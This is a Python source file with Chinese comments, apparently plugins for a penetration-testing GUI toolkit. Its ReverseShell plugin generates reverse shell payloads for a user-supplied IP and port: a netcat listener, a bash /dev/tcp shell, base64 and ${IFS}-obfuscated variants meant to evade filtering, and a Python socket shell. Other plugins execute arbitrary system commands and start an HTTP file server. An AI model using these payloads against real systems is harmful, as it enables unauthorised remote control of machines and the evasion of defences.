import http.server
import socketserver
import threading

# 载荷生成
class ReverseShell(Plugin):
    menu="载荷生成"
    name="反弹Shell"
    type="laboratory"
    def buildWindow(self):
        tab_laboratory = self.frame_args["tab_laboratory"]
        frame_horizontal = tk.Frame(tab_laboratory)
        frame_horizontal.grid(row=0, column=0, padx=5, pady=10, sticky=tk.W)
        host_label = tk.Label(frame_horizontal, text="反弹IP:")
        host_label.grid(row=0, column=nexti(i=0))
        host_entry = tk.Entry(frame_horizontal, width=20)
        host_entry.grid(row=0, column=nexti())
        port_label = tk.Label(frame_horizontal, text="端口:")
        port_label.grid(row=0, column=nexti())
        port_entry = tk.Entry(frame_horizontal, width=8)
        port_entry.grid(row=0, column=nexti())
        tk.Label(frame_horizontal, width=5).grid(row=0, column=nexti(), padx=5)  #占位
        button_start = tk.Button(frame_horizontal, text="生成", command=self.onStart)
        button_start.grid(row=0, column=nexti(), padx=5)
        tk.Label(frame_horizontal, width=5).grid(row=0, column=nexti(), padx=5)  #占位
        button_stop = tk.Button(frame_horizontal, text="查看帮助文档", command=self.showHelp)
        button_stop.grid(row=0, column=nexti(), padx=5)

        frame_vertical = tk.Frame(tab_laboratory)
        frame_vertical.grid(row=1, column=0, pady=10, sticky=tk.NSEW)
        self.output_text = tk.Text(frame_vertical)
        self.output_text.pack(expand=1, fill="both")

        # 设置网格布局列和行权重
        tab_laboratory.grid_columnconfigure(0, weight=1)
        tab_laboratory.grid_rowconfigure(1, weight=1)
        
        # 设置options
        self.options=Options()
        dic={"Name":"IP", "Current Setting":"", "Required":"yes", "Description":"回连IP", "obj":host_entry }
        self.options.append(dic)
        dic={"Name":"PORT", "Current Setting":"", "Required":"yes", "Description":"回连端口", "obj":port_entry }
        self.options.append(dic)
        return self.output_text
        
    def onStart(self, event=None):
        options=self.getOptions()
        IP=options["IP"]
        PORT=int(options["PORT"])
        
        result =f"[+] 在回连服务器{IP}上执行监听命令\n"
        result+=f"nc -lvp {PORT}"+"\n\n"
        result+=f"[+] 生成针对{IP}:{PORT}的反弹Shell载荷\n"
        result+="Bash反弹:\n"
        payload=f"bash -i >& /dev/tcp/{IP}/{PORT} 0>&1"
        result+=payload+"\n"
        b64payload=base64.b64encode(payload.encode("utf-8")).decode("utf-8")
        result+=f"echo {b64payload}|base64 -d|bash"+"\n"
        result+='bash${IFS}-c${IFS}"{echo,'+b64payload+'}|{base64,-d}|{bash,-i}"'
        result+="\n\n"
        result+="Python反弹:\n"
        payload=r'''python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("'''+IP+'",'+str(PORT)+'));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'+"'"
        result+=payload
        result+="\n\n"
        self.log(result)
        
    def showHelp(self, event=None):
        super().showHelp()

class CMD(Plugin):
    menu="实验室"
    name="命令行"
    type="laboratory"
    def buildWindow(self):
        tab_laboratory = self.frame_args["tab_laboratory"]
        frame_horizontal = tk.Frame(tab_laboratory)
        frame_horizontal.grid(row=0, column=0, padx=5, pady=10, sticky=tk.W)
        cmd_label = tk.Label(frame_horizontal, text="CMD:")
        cmd_label.grid(row=0, column=nexti(i=0))
        cmd_entry = tk.Entry(frame_horizontal, width=100)
        cmd_entry.grid(row=0, column=nexti())
        tk.Label(frame_horizontal, width=5).grid(row=0, column=nexti(), padx=5)  #占位
        button_start = tk.Button(frame_horizontal, text="执行", command=self.onStart)
        button_start.grid(row=0, column=nexti(), padx=5)
        button_stop = tk.Button(frame_horizontal, text="停止", command=self.onStop)
        button_stop.grid(row=0, column=nexti(), padx=5)
        tk.Label(frame_horizontal, width=5).grid(row=0, column=nexti(), padx=5)  #占位
        button_stop = tk.Button(frame_horizontal, text="查看帮助文档", command=self.showHelp)
        button_stop.grid(row=0, column=nexti(), padx=5)

        frame_vertical = tk.Frame(tab_laboratory)
        frame_vertical.grid(row=1, column=0, pady=10, sticky=tk.NSEW)
        self.output_text = tk.Text(frame_vertical)
        self.output_text.pack(expand=1, fill="both")
        
        # 绑定回车事件
        cmd_entry.bind('<Return>', self.onStart)

        # 设置网格布局列和行权重
        tab_laboratory.grid_columnconfigure(0, weight=1)
        tab_laboratory.grid_rowconfigure(1, weight=1)
        
        # 设置options
        self.options=Options()
        dic={"Name":"CMD", "Current Setting":"", "Required":"yes", "Description":"执行的命令", "obj":cmd_entry }
        self.options.append(dic)
        return self.output_text
        
    def onStart(self, event=None):
        options=self.getOptions()
        cmd=options["CMD"]
        
        self.log(f"[+] {cmd}\n")
        self.executeCommand(cmd, logfunc=self.log)
        # TODO：添加自定义命令，并使自定义命令和系统命令都支持管道

    def onStop(self, event=None):
        self.log("[*] onStop\n")
            
    def showHelp(self, event=None):
        super().showHelp()
        help="功能上相当于system(CMD)\n\n"\
             "Windows下常用命令：\n"\
             "netstat -ano | findstr LISTEN\t\t\t查看监听端口\n"\
             "\n"
        self.log(help)
        
class WorkflowOrchestration(Plugin):
    menu="实验室"
    name="场景编排demo"
    type="text"
    def run(self, text):
        tasks=[]
        tasks+=[RemoveDuplicates]
        tasks+=[ToLower]
        tasks+=[SortLines]
        
        for _ in tasks:
            text=_().run(text)
        
        return text
    
class HttpServer(Plugin):
    menu="实验室"
    name="http.server"
    type="laboratory"
    server=None
    def buildWindow(self):
        tab_laboratory = self.frame_args["tab_laboratory"]
        frame_horizontal = tk.Frame(tab_laboratory)
        frame_horizontal.grid(row=0, column=0, padx=5, pady=10, sticky=tk.W)
        bind_label = tk.Label(frame_horizontal, text="bind:")
        bind_label.grid(row=0, column=nexti(i=0))
        ip_entry = tk.Entry(frame_horizontal, width=16)
        ip_entry.insert(0, "0.0.0.0")
        ip_entry.grid(row=0, column=nexti())
        tk.Label(frame_horizontal, width=1).grid(row=0, column=nexti(), padx=2)  #占位
        port_entry = tk.Entry(frame_horizontal, width=6)
        port_entry.insert(0, "5000")
        port_entry.grid(row=0, column=nexti())
        tk.Label(frame_horizontal, width=5).grid(row=0, column=nexti(), padx=5)  #占位
        button_start = tk.Button(frame_horizontal, text="开始", command=self.onStart)
        button_start.grid(row=0, column=nexti(), padx=5)
        button_stop = tk.Button(frame_horizontal, text="停止", command=self.onStop)
        button_stop.grid(row=0, column=nexti(), padx=5)
        tk.Label(frame_horizontal, width=5).grid(row=0, column=nexti(), padx=5)  #占位
        button_stop = tk.Button(frame_horizontal, text="查看帮助文档", command=self.showHelp)
        button_stop.grid(row=0, column=nexti(), padx=5)

        frame_vertical = tk.Frame(tab_laboratory)
        frame_vertical.grid(row=1, column=0, pady=10, sticky=tk.NSEW)
        self.output_text = tk.Text(frame_vertical)
        self.output_text.pack(expand=1, fill="both")

        # 设置网格布局列和行权重
        tab_laboratory.grid_columnconfigure(0, weight=1)
        tab_laboratory.grid_rowconfigure(1, weight=1)
        
        # 设置options
        self.options=Options()
        dic={"Name":"IP", "Current Setting":"", "Required":"yes", "Description":"监听网卡的IP", "obj":ip_entry }
        self.options.append(dic)
        dic={"Name":"PORT", "Current Setting":"", "Required":"yes", "Description":"监听端口", "obj":port_entry }
        self.options.append(dic)
        
        #MyHandler里会用
        PluginGlobalStorage[self.__class__.__name__]={"class_obj":self}
        return self.output_text
        
    def onStart(self, event=None):
        options=self.getOptions()
        IP=options["IP"]
        PORT=int(options["PORT"])
        
        class MyHandler(http.server.SimpleHTTPRequestHandler):
            def log_message(self, format, *args):
                msg=format%args
                obj=PluginGlobalStorage["HttpServer"]["class_obj"]
                obj.log(msg+"\n")
                
        def fn():
            with socketserver.TCPServer((IP, PORT), MyHandler) as self.server:
                self.log(f"监听于{IP}:{PORT}\n")
                self.server.serve_forever()
                
        self.log("[+] 启动Server\n")
        thread = threading.Thread(target=fn)
        thread.start()

    def onStop(self, event=None):
        if self.server:
            self.log("[+] 关闭Server\n")
            self.server.shutdown()
            self.server=None
        else:
            self.log("[*] Server未启动\n")
            
    def showHelp(self, event=None):
        super().showHelp()
        self.log("相当于在python3下调用：\n")
        self.log("python -m http.server port\n\n")
        self.log("或者相当于在python2.7下调用：\n")
        self.log("python -m SimpleHTTPServer port\n\n")
        
